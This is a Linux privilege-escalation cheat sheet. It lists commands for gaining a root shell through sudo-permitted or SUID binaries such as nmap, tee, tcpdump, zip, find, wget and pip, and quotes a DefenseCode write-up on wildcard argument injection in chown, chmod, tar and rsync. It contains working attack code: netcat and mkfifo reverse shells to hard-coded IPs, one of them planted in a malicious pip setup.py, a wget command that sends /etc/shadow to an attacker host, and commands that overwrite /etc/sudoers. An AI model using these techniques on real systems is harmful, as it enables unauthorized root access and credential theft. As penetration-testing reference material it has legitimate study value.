Why it is possible to run "sudo -l" without a password?

By default, if the NOPASSWD tag is applied to any of the entries for a user on the current host, 
he or she will be able to run "sudo -l" without a password. This behavior may be overridden via 
the verifypw and listpw options

However, these rules only affect the current user, so if user impersonation is possible 
(using su) sudo -l should be launched from this user as well. 

BeRoot collects all these rules from all possible user an realize exaclty the same tests 
as listed perviously (e.g sudoers file method).

SUDO -l Permissions

Let’s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find, zip and package installers (pip, npm).
nmap suid

nmap --script <(echo 'require "os".execute "/bin/sh"')

or

nmap --interactive

tee suid

If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let’s say tidy.sh is executed as root on the server, we can write the below code in temp.sh

temp.sh
echo "example_user ALL=(ALL) ALL" > /etc/sudoers

or

chmod +w /etc/sudoers to add write properties to sudoers file to do the above

and then

cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh

which will add contents of temp.sh to tidyup.sh. (Assuming tidyup.sh is running as root by crontab)
tcpdump

The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).

Create a temp.sh ( which contains the commands to executed as root )

id
/bin/nc 192.168.110.1 4444 -e /bin/bash

Execute the command

sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root

where

-C file_size : Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).

-W Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a 'rotating' buffer.  In addition, it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly. Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in cyclical files per timeslice.

-z postrotate-command Used in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file " where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip will compress each savefile using gzip or bzip2.

Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn't disturb the capture process.

And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &  arguments arrangements and execute the command that you want.

 -Z user
 --relinquish-privileges=user If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.

 This behavior can also be enabled by default at compile time.

zip

touch /tmp/exploit
sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"

find

If find is suid, we can use

touch foo
find foo -exec whoami \;

Here, the foo file (a blank file) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.

HollyGrace has mentioned this in Linux PrivEsc: Abusing SUID More can be learn How-I-got-root-with-sudo.
wget

If the user has permission to run wget as sudo, we can read files (if the user whom we are sudo-ing have the permisson to read) by using –post-file parameter

post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.

Example:

sudo -u root wget --post-file=/etc/shadow http://AttackerIP:Port

On the attacker side, there can be a nc listener. The above would send the contents of /etc/shadow to the listener in the post request.
Package Installation

pip

If the user have been provided permission to install packages as a sudo for example

User username may run the following commands on hostname:
   (root) /usr/bin/pip install *

We can exploit this by creating a custom pip package which would provide us a shell.

First, create a folder (Let’s name it helloworld), and create two files setup.py and helloworld.py

username@hostname:/tmp/helloworld$ ls
helloworld.py setup.py

Let’s see, what setup.py contains

cat setup.py

from setuptools import setup
import os
print os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.26 4444 >/tmp/f")

setup(
    name='helloworld-script',    # This is the name of your PyPI-package.
    version='0.1',               # Update the version number for new releases
    scripts=['helloworld']       # The name of your scipt, and also the command you'll be using for calling it
)

and helloworld.py

cat helloworld.py
#!/usr/bin/env python
print "Hello World"

The above can be a part of a sample package of python pip. For more details refer A sample project that exists for PyPUG’s “Tutorial on Packaging and Distributing Projects” , How To Package Your Python Code , A simple Hello World setuptools package and installing it with pip and Packaging and distributing projects

The above package can be installed by using

sudo -u root /usr/bin/pip install -e /tmp/helloworld

Obtaining file:///tmp/helloworld

The above would execute setup.py and provide us the shell.

Refer Installing Packages for different ways to install a pip package

Let’s see the installed application

pip list
Flask-CouchDB (0.2.1)
helloworld-script (0.1, /tmp/helloworld)
Jinja2 (2.10)

npm

npm allows packages to take actions that could result in a malicious npm package author to create a worm that spreads across the majority of the npm ecosystem. Refer npm fails to restrict the actions of malicious npm packages , npm install could be dangerous: Rimrafall and Package install scripts vulnerability
Unix Wildcards

The below text is directly from the DefenseCode Unix WildCards Gone Wild.
Chown file reference trick (file owner hijacking)

First really interesting target I’ve stumbled across is ‘chown’. Let’s say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to ‘nobody’. Pay attention to the file owners in the following files list.

[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx------. 22 user user 4096 Oct 28 17:34 ..

-rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
-rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
-rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php

Files in this public directory are mostly owned by the user named ‘user’, and root user will now change that to ‘nobody’.

[root@defensecode public]# chown -R nobody:nobody \*.php

Let’s see who owns files now…

root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx------. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
-rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
-rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
-rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
-rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
-rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
-rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
-rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php

Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group ‘nobody’, but somehow, all files are owned by the user ‘leon’ now. If we take closer look, this directory previously contained just the following two files created and owned by the user ‘leon’.

-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php

Thing is that wildcard character used in ‘chown’ command line took arbitrary ‘–reference=.drf.php’ file and passed it to the chown command at the command line as an option.

Let’s check chown manual page (man chown):

--reference=RFILE     use RFILE's owner and group rather than specifying OWNER:GROUP values

So in this case, ‘–reference’ option to ‘chown’ will override ‘nobody:nobody’ specified as the root, and new owner of files in this directory will be exactly same as the owner of ‘.drf.php’, which is in this case user ‘leon’. Just for the record, ‘.drf’ is short for Dummy Reference File. :)

To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument to the –reference option, file that’s owned by some other user, not ‘leon’, in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically “hijack” files that are of interest to us.

Even more, if user ‘leon’ previously created a symbolic link in that directory that points to let’s say /etc/shadow, ownership of /etc/shadow would also be changed to the user ‘leon’.
Chmod file reference trick

Another interesting attack vector similar to previously described ‘chown’ attack is ‘chmod’. Chmod also has –reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):

--reference=RFILE    :   use RFILE's mode instead of MODE values

Example is presented below.

[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php

-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php

Superuser will now try to set mode 000 on all files.

[root@defensecode public]# chmod 000 *

Let’s check permissions on files…

[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php

What happened? Instead of 000, all files are now set to mode 777 because of the ‘–reference’ option supplied through file name..Once again,file .drf.php owned by user ‘leon’ with mode 777 was used as reference file and since –reference option is supplied, all files will be set to mode 777. Beside just –reference option, attacker can also create another file with ‘-R’ filename, to change file permissions on files in all subdirectories recursively.
Tar arbitrary command execution

Previous example is nice example of file ownership hijacking. Now, let’s go to even more interesting stuff like arbitrary command execution. Tar is very common unix program for creating and extracting archives. Common usage for lets say creating archives is:

[root@defensecode public]# tar cvvf archive.tar *

So, what’s the problem with ‘tar’? Thing is that tar has many options,and among them, there some pretty interesting options from arbitrary parameter injection point of view. Let’s check tar manual page (man tar):

--checkpoint[=NUMBER]      : display progress messages every NUMBERth record (default 10)
--checkpoint-action=ACTION : execute ACTION on each checkpoint

There is ‘–checkpoint-action’ option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.

Check the following directory:

[root@defensecode public]# ls -al
total 72
drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

Now, for example, root user wants to create archive of all files in current directory.

[root@defensecode public]# tar cf archive.tar *
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Boom! What happened? /usr/bin/id command gets executed! We’ve just achieved arbitrary command execution under root privileges. Once again, there are few files created by user ‘leon’.

  -rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
  -rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
  -rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the 'tar' program as command line options. Basically, they command tar to execute shell.sh shell script upon the execution.

[root@defensecode public]# cat shell.sh
/usr/bin/id

So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the ‘root’ account above.
Rsync arbitrary command execution

Rsync is “a fast, versatile, remote (and local) file-copying tool”, that is very common on Unix systems. If we check ‘rsync’ manual page, we can again find options that can be abused for arbitrary command execution.

Rsync manual: “You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote.”

Interesting rsync option from manual:

-e, --rsh=COMMAND       specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine

Let’s abuse one example directly from the ‘rsync’ manual page. Following example will copy all C files in local directory to a remote host ‘foo’ in ‘/src’ directory.

# rsync -t *.c foo:src/

Directory content:

[root@defensecode public]# ls -al
total 72
drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c

Now root will try to copy all C files to the remote server.

[root@defensecode public]# rsync -t *.c foo:src/

rsync: connection unexpectedly closed (0 bytes received so far) [sender]
rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]

Let’s see what happened…

-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c

After ‘rsync’ execution, new file shell_output.txt whose owner is root is created in same directory.

-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt

If we check its content, following data is found.

[root@defensecode public]# cat shell_output.txt
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Trick is that because of the ‘*.c’ wildcard, ‘rsync’ got ‘-e sh shell.c’ option on command line, and shell.c will be executed upon’rsync’ start. Content of shell.c is presented below.

[root@defensecode public]# cat shell.c
/usr/bin/id > shell_output.txt
